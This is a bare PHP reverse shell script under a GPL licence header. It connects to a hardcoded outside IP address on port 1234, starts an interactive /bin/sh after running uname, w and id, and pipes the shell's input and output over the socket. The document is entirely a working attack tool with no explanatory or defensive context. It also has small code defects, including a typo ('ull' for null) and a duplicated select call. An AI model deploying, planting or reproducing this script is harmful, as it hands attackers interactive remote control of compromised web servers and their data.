<?php
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

set_time_limit(0); // No execution time limit 
$ip = '18.217.54.18';
$port = 1234;
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/sh -i';  // Force shell to be interactive
$write_a = null;
$error_a = ull;

chdir("/");  // Change to /
umask(0);    // Unset any umask

$sock = fsockopen($ip, $port, $errno, $errstr, 30); // Initiate a socket connection
if (!$sock) {
    print("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is the pipe the child will read from
    1 => array("pipe", "w"),  // stdout is the pipe the child will write to
    2 => array("pipe", "w")   // stderr is the pipe the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (true) {
    if (feof($sock)) {
        print("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        print("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
